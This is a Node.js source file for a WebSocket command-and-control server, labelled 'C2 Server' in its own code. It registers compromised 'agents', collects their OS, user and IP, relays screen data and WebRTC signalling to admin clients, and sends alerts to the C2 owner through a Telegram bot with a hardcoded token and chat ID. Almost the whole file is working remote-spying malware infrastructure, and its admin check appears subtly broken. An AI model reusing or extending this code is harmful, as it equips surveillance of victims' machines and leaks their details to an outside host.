const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const https = require('https');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

// Store active sessions: ID -> { ws, info, isAdmin, lastSeen }
let clients = {};

// Serve admin.html from the current directory
app.use(express.static(path.join(__dirname))); 

function notifyTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {
        // Silently ignore errors here to keep the server fast
    }).on('error', (e) => {});
}

wss.on('connection', (ws) => {
    const id = uuidv4().substr(0, 8);
    clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

    console.log(`[+] Client Connected: ${id}`);

    // Send registration confirmation back to the client
    ws.send(JSON.stringify({ type: 'registered', id: id }));

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);

            // Check if this is an Admin connecting
            if (data.type === 'register_admin') {
                clients[id].isAdmin = true;
                console.log(`[ADMIN] Connected with ID: ${id}`);
                return;
            }

            // If it's an agent reporting in
            if (data.type === 'info') {
                clients[id].info = data;
                clients[id].lastSeen = Date.now();
                
                // Notify all admins about the new user via UI
                notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                
                // Broadcast the info directly to admins so they appear in the grid immediately
                broadcastToAdmin(id, data);

                // Trigger Telegram Notification for the C2 owner
                notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
            } 
            // Forward signaling data (Offer/Answer/Candidate) between users
            else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                forwardToTarget(id, data);
            } 
            // Handle screen data or other generic broadcasts
            else {
                // Log screen updates or other events to admins
                if (data.type === 'screen_data') {
                    broadcastToAdmin(id, data);
                } else {
                    // Fallback logging for any other message types
                    broadcastToAdmin(id, data);
                }
            }
        } catch (e) {
            console.error("Message parsing error:", e);
        }
    });

    ws.on('close', () => {
        delete clients[id];
        notifyAdmin(id, '🔴 User Disconnected');
        notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
    });
});

function notifyAdmin(id, msg) {
    // Broadcast to all admins
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(id, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, ...data }));
        }
    });
}

function forwardToTarget(sourceId, data) {
    // If the data contains a specific target ID, send it there
    if (data.targetId && clients[data.targetId]) {
        const targetWs = clients[data.targetId].ws;
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify(data));
        }
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`C2 Server running on port ${PORT}`);
});
